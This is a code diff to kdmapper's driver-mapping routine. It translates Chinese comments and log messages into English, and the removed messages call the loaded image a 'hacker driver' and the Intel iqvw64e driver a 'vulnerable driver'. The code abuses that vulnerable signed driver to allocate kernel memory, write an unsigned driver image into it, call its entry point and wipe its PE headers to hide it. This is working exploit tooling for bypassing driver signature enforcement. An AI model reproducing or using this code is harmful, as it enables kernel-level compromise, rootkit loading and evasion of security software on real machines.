@@ -2,44 +2,42 @@
 
 uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver_path)
 {
-	//读取黑客驱动数据
 	std::vector<uint8_t> raw_image = { 0 };
+
 	if (!utils::ReadFileToMemory(driver_path, &raw_image))
 	{
-		std::cout << "[-] 无法读取黑客驱动数据到内存中" << std::endl;
+		std::cout << "[-] Failed to read image to memory" << std::endl;
 		return 0;
 	}
 
-	//尝试取得NT文件头
 	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(raw_image.data());
+
 	if (!nt_headers)
 	{
-		std::cout << "[-] 不是有效的x64位驱动程序" << std::endl;
+		std::cout << "[-] Invalid or non-x64 PE image" << std::endl;
 		return 0;
 	}
 
-	//获取黑客驱动的映像大小
 	const uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;
-	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
-	//在漏洞驱动里面申请相应大小的内存空间
+	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	uint64_t kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::NonPagedPool, image_size);
 
 	do
 	{
 		if (!kernel_image_base)
 		{
-			std::cout << "[-] 无法在漏洞驱动程序申请内存空间" << std::endl;
+			std::cout << "[-] Failed to allocate remote image in kernel" << std::endl;
 			break;
 		}
 
-		std::cout << "[+] 申请漏洞驱动空间地址在 0x" << reinterpret_cast<void*>(kernel_image_base) << std::endl;
+		std::cout << "[+] Image base has been allocated at 0x" << reinterpret_cast<void*>(kernel_image_base) << std::endl;
 
-		// Copy image headers 复制映像头
+		// Copy image headers
 
 		memcpy(local_image_base, raw_image.data(), nt_headers->OptionalHeader.SizeOfHeaders);
 
-		// Copy image sections 复制映像节区
+		// Copy image sections
 
 		const PIMAGE_SECTION_HEADER section_headers = IMAGE_FIRST_SECTION(nt_headers);
 
@@ -54,66 +52,61 @@ uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& dr
 		}
 
 		// Initialize stack cookie if driver was compiled with /GS
-		// 如果程序编译带了/GS，还要初始化堆栈cookie
-
+		
 		InitStackCookie(local_image_base);
 
 		// Resolve relocs and imports
-		// 解决重定位和输入表
 
 		// A missing relocation directory is OK, but disallow IMAGE_FILE_RELOCS_STRIPPED
 		// Not checked: IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE in DllCharacteristics. The DDK/WDK has never set this mostly for historical reasons
 		const portable_executable::vec_relocs& relocs = portable_executable::GetRelocs(local_image_base);
 		if (relocs.empty() && (nt_headers->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) != 0)
 		{
-			std::cout << "[-] 映像无法重定位" << std::endl;
+			std::cout << "[-] Image is not relocatable" << std::endl;
 			break;
 		}
-
+		
 		RelocateImageByDelta(relocs, kernel_image_base - nt_headers->OptionalHeader.ImageBase);
 
 		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base)))
 		{
-			std::cout << "[-] 无法修复导入表" << std::endl;
+			std::cout << "[-] Failed to resolve imports" << std::endl;
 			break;
 		}
 
 		// Write fixed image to kernel
-		// 写入到内核空间
 
 		if (!intel_driver::WriteMemory(iqvw64e_device_handle, kernel_image_base, local_image_base, image_size))
 		{
-			std::cout << "[-] 无法将黑客驱动写入到漏洞内核内存空间" << std::endl;
+			std::cout << "[-] Failed to write local image to remote image" << std::endl;
 			break;
 		}
 
 		VirtualFree(local_image_base, 0, MEM_RELEASE);
 
 		// Call driver entry point
-		// 调用黑客驱动函数
 
 		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
 
-		std::cout << "[<] 调用入口在 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl;
+		std::cout << "[<] Calling DriverEntry 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl;
 
 		NTSTATUS status = 0;
 
 		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point))
 		{
-			std::cout << "[-] 无法调用入口函数" << std::endl;
+			std::cout << "[-] Failed to call driver entry" << std::endl;
 			break;
 		}
 
-		std::cout << "[+] DriverEntry函数返回 0x" << std::hex << std::setw(8) << std::setfill('0') << std::uppercase << status << std::nouppercase << std::dec << std::endl;
+		std::cout << "[+] DriverEntry returned 0x" << std::hex << std::setw(8) << std::setfill('0') << std::uppercase << status << std::nouppercase << std::dec << std::endl;
 
 		// Erase PE headers
-		// 移除PE头
 
 		intel_driver::SetMemory(iqvw64e_device_handle, kernel_image_base, 0, nt_headers->OptionalHeader.SizeOfHeaders);
 		return kernel_image_base;
+
 	} while (false);
 
-	//释放内存
 	VirtualFree(local_image_base, 0, MEM_RELEASE);
 	intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);
 
@@ -168,12 +161,12 @@ void kdmapper::InitStackCookie(void* base)
 	ULONG config_dir_size = 0;
 	const PIMAGE_LOAD_CONFIG_DIRECTORY64 config_dir = static_cast<PIMAGE_LOAD_CONFIG_DIRECTORY64>(
 		RtlImageDirectoryEntryToData(base,
-			TRUE,
-			IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,
-			&config_dir_size));
+									TRUE,
+									IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,
+									&config_dir_size));
 	if (config_dir == nullptr || config_dir_size == 0)
 		return;
-
+	
 	uint64_t cookie_va;
 	if ((cookie_va = static_cast<uint64_t>(config_dir->SecurityCookie)) == 0)
 		return;
